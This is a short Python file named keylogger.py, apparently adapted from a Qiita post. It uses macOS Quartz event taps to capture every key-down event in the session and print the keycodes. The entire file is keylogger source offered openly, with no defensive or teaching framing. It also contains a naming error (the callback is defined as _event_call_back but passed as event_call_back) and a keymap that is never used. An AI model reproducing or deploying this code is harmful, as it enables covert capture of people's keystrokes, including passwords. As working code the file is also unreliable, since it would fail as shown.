"""
from https://qiita.com/61503891/items/4ae3ae64b2531b516321
keylogger.py
"""
import Quartz

engcodes = [0, 11, 8, 2, 14, 3, 5, 4, 34, 38, 40, 37, 46, 45, 31, 35, 12, 15, 1, 17, 32, 9, 13, 7, 16, 6]
keymap = {code: chr(i+97) for i, code in enumerate(engcodes)}
    
def _event_call_back(proxy, etype, event, refcon):
    keycode = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
    print(keycode)
    return event


def keylogger():
    mask = Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown)
    tap = Quartz.CGEventTapCreate(Quartz.kCGSessionEventTap,
                                  Quartz.kCGHeadInsertEventTap, 0, mask, event_call_back, None)

    assert tap, "failed to create event tap"

    run_loop_source = Quartz.CFMachPortCreateRunLoopSource(Quartz.kCFAllocatorDefault, tap, 0)
    Quartz.CFRunLoopAddSource(Quartz.CFRunLoopGetCurrent(), run_loop_source, Quartz.kCFRunLoopCommonModes)
    Quartz.CGEventTapEnable(tap, True)
    Quartz.CFRunLoopRun()
